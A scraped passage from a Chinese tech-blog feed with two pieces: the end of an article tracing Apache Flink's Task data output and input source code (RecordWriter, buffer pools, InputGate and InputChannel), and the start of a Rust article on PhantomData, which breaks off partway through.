  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T14:49:46.000Z" title="Mon Jan 05 2026 14:49:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>经过前面的学习，Flink 的几个核心概念相关的源码实现我们已经了解了。本文我们来梳理 Task 的数据交互相关的源码。</p>
<h3 data-id="heading-0">数据输出</h3>
<p>话不多说，我们直接进入正题。首先来看 Task 的数据输出，在进入流程之前，我们先介绍几个基本概念。</p>
<h4 data-id="heading-1">基本概念</h4>
<ul>
<li>RecordWriterOutput：它是 Output 接口的一个具体实现类，底层使用 RecordWriter 来发送数据。</li>
<li>RecordWriter：数据写入的执行者，负责将数据写到 ResultPartition。</li>
<li>ResultPartition 和 ResultSubpartition：ResultPartition 是 ExecutionGraph 中一个节点的输出结果，下游的每个需要从当前 ResultPartition 消费数据的 Task 都会有一个 ResultSubpartition。</li>
<li>ChannelSelector：用来决定一个 Record 要被写到哪个 Subpartition 中。</li>
<li>LocalBufferPool：用来管理 Buffer 的缓冲池。在介绍反压的原理时，我们提到过。</li>
</ul>
<p>对这些基本概念有了一定的了解之后，我们来看数据输出的具体流程。</p>
<h4 data-id="heading-2">执行流程</h4>
<p>我们以 map 为例，看一下数据的输出过程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ed568cbc1734c71ae96ca84bb8c8305~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768229385&amp;x-signature=LNbTqu9p6Ye7O7tH2oz32i0hyQs%3D" alt="DataOutput" loading="lazy"/></p>
<p>在 <code>StreamMap.processElement</code> 方法中，调用完 map 方法之后，就会调用 <code>output.collect</code> 方法将数据输出，这里的 output 就是 RecordWriterOutput。在 RecordWriterOutput 中，会调用 RecordWriter 的 emit 方法。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">private</span> &lt;X&gt; <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pushToRecordWriter</span>(<span class="hljs-params">StreamRecord&lt;X&gt; <span class="hljs-keyword">record</span></span>)</span> {
    serializationDelegate.setInstance(<span class="hljs-keyword">record</span>);

    <span class="hljs-keyword">try</span> {
        recordWriter.emit(serializationDelegate);
    } <span class="hljs-keyword">catch</span> (IOException e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UncheckedIOException(e.getMessage(), e);
    }
}
</code></pre>
<p>这里的 serializationDelegate 是用来对 record 进行序列化的。RecordWriter 有两个实现类，一个是 ChannelSelectorRecordWriter，另一个是 BroadcastRecordWriter。ChannelSelectorRecordWriter 需要先调用 ChannelSelector 选择对应的 subparition，然后进行写入。BroadcastRecordWriter 则是写到所有的 subparition。</p>
<p>接下来就是调用 <code>BufferWritingResultPartition.emitRecord</code> 来写入数据。</p>
<pre><code class="hljs language-scss" lang="scss">public void <span class="hljs-built_in">emitRecord</span>(ByteBuffer record, int targetSubpartition) throws IOException {
    totalWrittenBytes += record<span class="hljs-selector-class">.remaining</span>();

    BufferBuilder buffer = <span class="hljs-built_in">appendUnicastDataForNewRecord</span>(record, targetSubpartition);

    while (record.hasRemaining()) {
        <span class="hljs-comment">// full buffer, partial record</span>
        <span class="hljs-built_in">finishUnicastBufferBuilder</span>(targetSubpartition);
        buffer = <span class="hljs-built_in">appendUnicastDataForRecordContinuation</span>(record, targetSubpartition);
    }

    if (buffer.isFull()) {
        <span class="hljs-comment">// full buffer, full record</span>
        <span class="hljs-built_in">finishUnicastBufferBuilder</span>(targetSubpartition);
    }

    <span class="hljs-comment">// partial buffer, full record</span>
}
</code></pre>
<p>这里把 record 写入到 buffer 中，如果 buffer 不够，则会从 LocalBufferPool 中申请新的 buffer，申请到之后就会继续写入。下面是具体的申请过程。</p>
<pre><code class="hljs language-scss" lang="scss">private MemorySegment <span class="hljs-built_in">requestMemorySegment</span>(int targetChannel) {
    MemorySegment segment = null;
    synchronized (availableMemorySegments) {
        <span class="hljs-built_in">checkDestroyed</span>();

        if (!availableMemorySegments.isEmpty()) {
            segment = availableMemorySegments<span class="hljs-selector-class">.poll</span>();
        } else if (isRequestedSizeReached()) {
            <span class="hljs-comment">// Only when the buffer request reaches the upper limit(i.e. current pool size),</span>
            <span class="hljs-comment">// requests an overdraft buffer.</span>
            segment = <span class="hljs-built_in">requestOverdraftMemorySegmentFromGlobal</span>();
        }

        if (segment == null) {
            return null;
        }

        if (targetChannel != UNKNOWN_CHANNEL) {
            if (++subpartitionBuffersCount[targetChannel] == maxBuffersPerChannel) {
                unavailableSubpartitionsCount++;
            }
        }

        <span class="hljs-built_in">checkAndUpdateAvailability</span>();
    }
    return segment;
}
</code></pre>
<p>如果有可用内存，就直接从队列中出队。如果达到了本地 BufferPool 的上限，就从全局的 NetworkBufferPool 中申请，申请不到就会阻塞写入过程，等待申请。最后还会检查并更新可用内存状态。</p>
<p>有了可用的 buffer 之后，就会调用 addToSubpartition，最终数据存储在 PipelinedSubpartition 的 buffers 队列中。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">addToSubpartition</span><span class="hljs-params">(
        BufferBuilder buffer,
        <span class="hljs-type">int</span> targetSubpartition,
        <span class="hljs-type">int</span> partialRecordLength,
        <span class="hljs-type">int</span> minDesirableBufferSize)</span>
        throws IOException </span>{
    <span class="hljs-type">int</span> desirableBufferSize =
            subpartitions[targetSubpartition].<span class="hljs-built_in">add</span>(
                    buffer.<span class="hljs-built_in">createBufferConsumerFromBeginning</span>(), partialRecordLength);

    <span class="hljs-built_in">resizeBuffer</span>(buffer, desirableBufferSize, minDesirableBufferSize);
}
</code></pre>
<h3 data-id="heading-3">数据输入</h3>
<p>看完了数据输出的过程之后，我们再来看一下数据输入的过程。首先还是了解几个基本概念。</p>
<h4 data-id="heading-4">基本概念</h4>
<ul>
<li>InputGate：InputGate 是对输入的封装，与 JobGraph 中的 JobEdge 一一对应，每个 InputGate 消费上游一个或多个 Resultpartition。</li>
<li>InputChannel：InputChannel 是和 ExecutionGraph 中的 ExecutionEdge 一一对应的。每个 InputChannel 接收一个 ResultSubpartition 的输出，InputChannel 主要关注 LocalInputChannel 和 RemoteInputChannel 两种实现。</li>
</ul>
<h4 data-id="heading-5">执行流程</h4>
<p>了解了具体概念之后，我们再看数据输入的具体流程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54ab8cf05ba14bc1b0a643b621cec5fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768229385&amp;x-signature=ekrK1mD9nROVo2i0Adeh1eL98bk%3D" alt="RecordInput" loading="lazy"/></p>
<p>数据输入的入口是 <code>StreamTask.processInput</code> 方法，这个方法中主要是调用 <code>inputProcessor.processInput</code> 方法，我们以 StreamOneInputProcessor 为例。这个方法就是调用 <code>input.emitNext</code> 方法。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> DataInputStatus emitNext(DataOutput&lt;T&gt; output) throws Exception {

    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-comment">// get the stream element from the deserializer</span>
        <span class="hljs-keyword">if</span> (currentRecordDeserializer != <span class="hljs-literal">null</span>) {
            RecordDeserializer.DeserializationResult result;
            <span class="hljs-keyword">try</span> {
                result = currentRecordDeserializer.getNextRecord(deserializationDelegate);
            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-keyword">throw</span> new IOException(
                        String.format(<span class="hljs-string">"Can't get next record for channel %s"</span>, lastChannel), e);
            }
            <span class="hljs-keyword">if</span> (result.isBufferConsumed()) {
                currentRecordDeserializer = <span class="hljs-literal">null</span>;
            }

            <span class="hljs-keyword">if</span> (result.isFullRecord()) {
                <span class="hljs-keyword">final</span> boolean breakBatchEmitting =
                        processElement(deserializationDelegate.getInstance(), output);
                <span class="hljs-keyword">if</span> (canEmitBatchOfRecords.check() &amp;&amp; !breakBatchEmitting) {
                    <span class="hljs-keyword">continue</span>;
                }
                <span class="hljs-keyword">return</span> DataInputStatus.MORE_AVAILABLE;
            }
        }

        Optional&lt;BufferOrEvent&gt; bufferOrEvent = checkpointedInputGate.pollNext();
        <span class="hljs-keyword">if</span> (bufferOrEvent.isPresent()) {
            <span class="hljs-comment">// return to the mailbox after receiving a checkpoint barrier to avoid processing of</span>
            <span class="hljs-comment">// data after the barrier before checkpoint is performed for unaligned checkpoint</span>
            <span class="hljs-comment">// mode</span>
            <span class="hljs-keyword">if</span> (bufferOrEvent.<span class="hljs-keyword">get</span>().isBuffer()) {
                processBuffer(bufferOrEvent.<span class="hljs-keyword">get</span>());
            } <span class="hljs-keyword">else</span> {
                DataInputStatus status = processEvent(bufferOrEvent.<span class="hljs-keyword">get</span>(), output);
                <span class="hljs-keyword">if</span> (status == DataInputStatus.MORE_AVAILABLE &amp;&amp; canEmitBatchOfRecords.check()) {
                    <span class="hljs-keyword">continue</span>;
                }
                <span class="hljs-keyword">return</span> status;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (checkpointedInputGate.isFinished()) {
                checkState(
                        checkpointedInputGate.getAvailableFuture().isDone(),
                        <span class="hljs-string">"Finished BarrierHandler should be available"</span>);
                <span class="hljs-keyword">return</span> DataInputStatus.END_OF_INPUT;
            }
            <span class="hljs-keyword">return</span> DataInputStatus.NOTHING_AVAILABLE;
        }
    }
}
</code></pre>
<p>这里是调用 <code>checkpointedInputGate.pollNext</code> 来获取输入的数据。它的内部就是调用 InputGate 的 pollNext 方法来获取数据。当获取到完整数据之后，就会调用 processElement 来处理数据。</p>
<p>我们以 SingleInputGate 为例看 InputGate 的 pollNext 方法。它的内部调用链路可用一直追踪到 readBufferFromInputChannel 方法，这个方法内会调用 <code>inputChannel.getNextBuffer</code>，这里交给 InputChannel 来具体执行数据读取。</p>
<pre><code class="hljs language-scss" lang="scss">public Optional&lt;BufferAndAvailability&gt; <span class="hljs-built_in">getNextBuffer</span>() throws IOException {
    <span class="hljs-built_in">checkError</span>();

    if (!toBeConsumedBuffers.isEmpty()) {
        return <span class="hljs-built_in">getBufferAndAvailability</span>(toBeConsumedBuffers.removeFirst());
    }

    ResultSubpartitionView subpartitionView = this<span class="hljs-selector-class">.subpartitionView</span>;
    if (subpartitionView == null) {
        <span class="hljs-comment">// There is a possible race condition between writing a EndOfPartitionEvent (1) and</span>
        <span class="hljs-comment">// flushing (3) the Local</span>
        <span class="hljs-comment">// channel on the sender side, and reading EndOfPartitionEvent (2) and processing flush</span>
        <span class="hljs-comment">// notification (4). When</span>
        <span class="hljs-comment">// they happen in that order (1 - 2 - 3 - 4), flush notification can re-enqueue</span>
        <span class="hljs-comment">// LocalInputChannel after (or</span>
        <span class="hljs-comment">// during) it was released during reading the EndOfPartitionEvent (2).</span>
        if (isReleased) {
            return Optional<span class="hljs-selector-class">.empty</span>();
        }

        <span class="hljs-comment">// this can happen if the request for the partition was triggered asynchronously</span>
        <span class="hljs-comment">// by the time trigger</span>
        <span class="hljs-comment">// would be good to avoid that, by guaranteeing that the requestPartition() and</span>
        <span class="hljs-comment">// getNextBuffer() always come from the same thread</span>
        <span class="hljs-comment">// we could do that by letting the timer insert a special "requesting channel" into the</span>
        <span class="hljs-comment">// input gate's queue</span>
        subpartitionView = <span class="hljs-built_in">checkAndWaitForSubpartitionView</span>();
    }

    BufferAndBacklog next = subpartitionView<span class="hljs-selector-class">.getNextBuffer</span>();
    <span class="hljs-comment">// ignore the empty buffer directly</span>
    while (next != null &amp;&amp; next.buffer()<span class="hljs-selector-class">.readableBytes</span>() == <span class="hljs-number">0</span>) {
        next<span class="hljs-selector-class">.buffer</span>()<span class="hljs-selector-class">.recycleBuffer</span>();
        next = subpartitionView<span class="hljs-selector-class">.getNextBuffer</span>();
        numBuffersIn<span class="hljs-selector-class">.inc</span>();
    }

    if (next == null) {
        if (subpartitionView.isReleased()) {
            throw new <span class="hljs-built_in">CancelTaskException</span>(
                    "Consumed partition " + subpartitionView + " has been released.");
        } else {
            return Optional<span class="hljs-selector-class">.empty</span>();
        }
    }

    Buffer buffer = next<span class="hljs-selector-class">.buffer</span>();

    if (buffer instanceof FullyFilledBuffer) {
        List&lt;Buffer&gt; partialBuffers = ((FullyFilledBuffer) buffer)<span class="hljs-selector-class">.getPartialBuffers</span>();
        int seq = next<span class="hljs-selector-class">.getSequenceNumber</span>();
        for (Buffer partialBuffer : partialBuffers) {
            toBeConsumedBuffers<span class="hljs-selector-class">.add</span>(
                    new BufferAndBacklog(
                            partialBuffer,
                            next.buffersInBacklog(),
                            buffer<span class="hljs-selector-class">.getDataType</span>(),
                            seq++));
        }

        return <span class="hljs-built_in">getBufferAndAvailability</span>(toBeConsumedBuffers.removeFirst());
    }

    return <span class="hljs-built_in">getBufferAndAvailability</span>(next);
}
</code></pre>
<p>我们先来看 LocalInputChannel，先获取到了 subpartitionView，并调用 getNextBuffer，这里其实就是从 PipelinedSubpartition 的 buffers 队列中读取数据。</p>
<p>RemoteInputChannel 则需要从 receivedBuffers 中读取数据，这个队列的数据就是消费上游数据后保存的。</p>
<p>至此，Flink 中 Task 的数据输入和输出过程的源码就梳理完了，更加底层的 Netty 相关代码我们在后面继续梳理。</p>
<h3 data-id="heading-6">总结</h3>
<p>最后简单总结一下，本文我们梳理了 Task 的数据输出和输入的过程。输出过程主要是利用 RecordWriter 将数据写入到 Buffer 中，输入过程则是利用 InputChannel 从 Buffer 消费的过程。如果你的 Flink 任务数据量特别大，并且没什么复杂的逻辑，可以考虑适当调整 localBufferPool 的大小来调优任务的吞吐。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rust 的 `PhantomData`：零成本把“语义信息”交给编译器]]></title>    <link>https://juejin.cn/post/7591705084671344678</link>    <guid>https://juejin.cn/post/7591705084671344678</guid>    <pubDate>2026-01-05T15:31:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591705084671344678" data-draft-id="7591728734982766619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rust 的 `PhantomData`：零成本把“语义信息”交给编译器"/> <meta itemprop="keywords" content="Rust"/> <meta itemprop="datePublished" content="2026-01-05T15:31:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Pomelo_刘金"/> <meta itemprop="url" content="https://juejin.cn/user/3450694359320669"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rust 的 `PhantomData`：零成本把“语义信息”交给编译器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3450694359320669/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Pomelo_刘金
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T15:31:03.000Z" title="Mon Jan 05 2026 15:31:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在写底层 Rust（尤其是 <strong>unsafe / 裸指针 / FFI</strong>）时，你会遇到一种常见矛盾：</p>
<ul>
<li><strong>运行时</strong>：你手里可能只有一个 <code>*const T</code> / <code>*mut T</code> / <code>*mut c_void</code>（比如外部库返回的句柄），结构体里并没有真正存放某个引用或某个类型的值。</li>
<li><strong>编译期</strong>：你又希望编译器知道“我这个类型<strong>和某个生命周期/类型绑定</strong>”，从而帮你做借用检查、推导 <code>Send/Sync</code>、避免错误混用等。</li>
</ul>
<p><code>std::marker::PhantomData&lt;T&gt;</code> 就是为了解决这个问题而存在的工具。官方文档的核心定义是：</p>
<blockquote>
<p><code>PhantomData&lt;T&gt;</code> 是一个 <strong>零大小类型</strong>（ZST），用于标记你的类型“<strong>行为上像是拥有/包含</strong> 一个 <code>T</code>”，尽管你实际上并没有存储 <code>T</code>。这会影响编译器计算一些安全相关属性。</p>
</blockquote>
<p>也因此，它常被称为“<strong>只在编译期生效的零成本抽象</strong>”。</p>
<ul>
<li><code>size_of::&lt;PhantomData&lt;T&gt;&gt;() == 0</code></li>
<li><code>align_of::&lt;PhantomData&lt;T&gt;&gt;() == 1</code></li>
</ul>
<p>下面用两个最典型的场景来科普：</p>
<ol>
<li><strong>绑定生命周期（防悬垂）</strong></li>
<li><strong>绑定类型参数（防混用）</strong></li>
</ol>
<hr/>
<h2 data-id="heading-0">1. 绑定生命周期：裸指针不带生命周期，需要用 <code>PhantomData&lt;&amp;'a T&gt;</code> 把借用关系“说清楚”</h2>
<p>假设你想实现一个 slice/数组的迭代器或视图，内部用裸指针表示范围：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Slice</span>&lt;T&gt; {
    start: *<span class="hljs-keyword">const</span> T,
    end: *<span class="hljs-keyword">const</span> T,
}
</code></pre>
<p>如果这些指针来自某个外部数据（比如 <code>Vec&lt;T&gt;</code> / <code>&amp;[T]</code>），为了避免悬垂指针，你的真实意图是：</p>
<blockquote>
<p><code>Slice</code> <strong>不能活得比原始数据更久</strong></p>
</blockquote>
<p>但问题是：<code>*const T</code> <strong>不携带生命周期</strong>，编译器无法从字段中推导“它借用了谁、借用了多久”。于是你会想加生命周期参数：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Slice</span>&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    start: *<span class="hljs-keyword">const</span> T,
    end: *<span class="hljs-keyword">const</span> T,
}
</code></pre>
<p>这会立刻遇到编译器抱怨：<code>'a</code> 没有被使用（unused lifetime parameter）。更重要的是：即使你强行让它通过，编译器也仍然不知道 <code>'a</code> 和哪些数据有关。</p>
<h3 data-id="heading-1">正确写法：加一个“假装持有引用”的标记字段</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::marker::PhantomData;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Slice</span>&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    start: *<span class="hljs-keyword">const</span> T,
    end: *<span class="hljs-keyword">const</span> T,
    _marker: PhantomData&lt;&amp;<span class="hljs-symbol">'a</span> T&gt;,
}
</code></pre>
<p><code>PhantomData&lt;&amp;'a T&gt;</code> 的含义可以直译为：</p>
<blockquote>
<p>“请把我当成<strong>好像</strong>内部存了一个 <code>&amp;'a T</code> 引用。”</p>
</blockquote>
